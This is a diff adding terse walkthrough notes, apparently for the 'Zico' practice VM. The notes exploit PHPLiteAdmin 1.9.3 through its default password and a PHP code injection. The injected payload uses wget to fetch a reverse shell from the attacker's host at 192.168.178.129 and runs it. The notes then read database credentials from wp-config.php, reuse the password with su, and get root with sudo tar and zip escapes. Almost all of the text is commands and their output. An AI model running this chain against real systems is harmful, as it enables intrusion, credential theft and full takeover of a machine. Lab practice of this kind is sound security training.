@@ -1,0 +1,53 @@
+http://192.168.178.150/dbadmin/test_db.php
+//login with default passwd admin
+
+//use this exploit
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
+
+<?php system("wget http://192.168.178.129:8888/php-reverse-shell.php -O /tmp/reverse-shell.php; php /tmp/reverse-shell.php"); ?>
+
+
+
+www-data@zico:/home/zico/wordpress$ cat wp-config.php
+
+/** MySQL database username */
+define('DB_USER', 'zico');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
+
+www-data@zico:/home/zico/wordpress$ mysql -u zico -p
+mysql -u zico -p
+Enter password: sWfCsfJSPV9H3AmQzw8
+
+ERROR 1045 (28000): Access denied for user 'zico'@'localhost' (using password: YES)
+www-data@zico:/home/zico/wordpress$ su zico
+su zico
+Password: sWfCsfJSPV9H3AmQzw8
+
+zico@zico:~/wordpress$ sudo -l
+sudo -l
+Matching Defaults entries for zico on this host:
+    env_reset, exempt_group=admin,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User zico may run the following commands on this host:
+    (root) NOPASSWD: /bin/tar
+    (root) NOPASSWD: /usr/bin/zip
+
+zico@zico:~/wordpress$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+< tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+or
+zico@zico:~/wordpress$ TF=$(mktemp -u)
+TF=$(mktemp -u)
+zico@zico:~/wordpress$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 35%)
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
